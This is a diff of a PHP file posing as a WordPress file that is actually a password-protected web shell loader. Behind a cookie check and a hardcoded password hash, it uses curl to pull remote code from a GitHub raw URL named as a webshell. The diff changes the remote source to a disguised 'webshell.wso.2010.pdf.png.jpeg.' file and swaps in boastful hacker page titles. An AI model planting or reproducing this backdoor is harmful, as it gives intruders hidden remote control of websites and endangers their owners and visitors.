@@ -19,12 +19,12 @@
  * @package WordPress
  */
 
-// are u challange me :v
+// IDAMAN FBI
 $hashed_password = '$2y$10$QSGYu2pSK8RtNYa4F/2DEuO5/kiaBnO9IBch7B4QSnA7z8zoZQarG'; // Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik default password gud boy
 // Fungsi untuk menampilkan form login
 //
 function admin_login() {
-    echo '<title>Login</title>';
+    echo '<title>Bapak Heker Indonesia Boleh Masuk | Script Kiddies Dilarang Masuk</title>';
     echo '<form method="post">';
     echo '<input type="password" name="password">';
     echo '<input type="submit" value="Login">';
@@ -44,11 +44,11 @@ if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
 
 $head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <meta name="robots" content="noindex">
-<title>explorer manager</title>
+<title>HACKERMANNN WUSHH HEREEE!!</title>
 <style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}
 </style>
 </head>';
-$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/templates.php";
+$url = "https://raw.githubusercontent.com/anonrocks/exploitssss/master/webshell.wso.2010.pdf.png.jpeg.";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
